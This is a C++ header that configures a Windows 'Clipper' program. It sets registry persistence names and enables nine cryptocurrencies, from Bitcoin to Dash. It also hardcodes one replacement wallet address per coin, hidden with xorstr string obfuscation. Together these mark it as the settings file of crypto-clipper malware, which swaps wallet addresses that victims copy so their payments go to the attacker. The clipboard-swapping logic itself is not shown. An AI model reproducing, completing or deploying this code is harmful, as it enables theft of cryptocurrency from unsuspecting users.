#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <exception>
#include <iostream>
#include <ostream>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <chrono>
#include <thread>
#include <shlobj.h>
#include <exception>
#include <typeinfo>
#include <stdexcept>
#include <ctime>
#include <filesystem>
#include <regex>

#include "xorstr.h"

/* Registry Settings */
std::string path = xorstr("Clipper");
std::string name = xorstr("Clipper");
std::string exe = xorstr("Clipper.exe");

/* Program Settings */
bool debugging = true;

bool m_btc = true;
bool m_ltc = true;
bool m_xmr = true;
bool m_eth = true;
bool m_xrp = true;
bool m_neo = true;
bool m_bch = true;
bool m_doge = true;
bool m_dash = true;

std::string btc = xorstr("1LXwFo3oQyFkpRCdV442iC4zj7jyZLLaEr");
std::string ltc = xorstr("LbimqExRHtsRA7jch9kkbnpPCcp4aARt59");
std::string xmr = xorstr("8BAZ7tVkqw4afPW9u5qNKp36Xu6JA3XciLmg42que39A2gQ9Fv2SxrLiFsRZsb3oTVhtParkvYw6KeiUYJ1wHoKPF45xEPc");
std::string eth = xorstr("0xced49bbeecc723d4c604a0fb0f548c1381f08e6e");
std::string xrp = xorstr("rNxp4h8apvRis6mJf9Sh8C6iRxfrDWN7AV");
std::string neo = xorstr("AcxgymDyJdouHT4ypPrzQC12NFLQsp9hZE");
std::string bch = xorstr("1LXwFo3oQyFkpRCdV442iC4zj7jyZLLaEr");
std::string doge = xorstr("DJ3bTjTzrYuNCxzFVCKDvb8JHECZbZC5UT");
std::string dash = xorstr("XgQqdZ7oY2qT97WHpVv77bzt4AY13JNrrF");
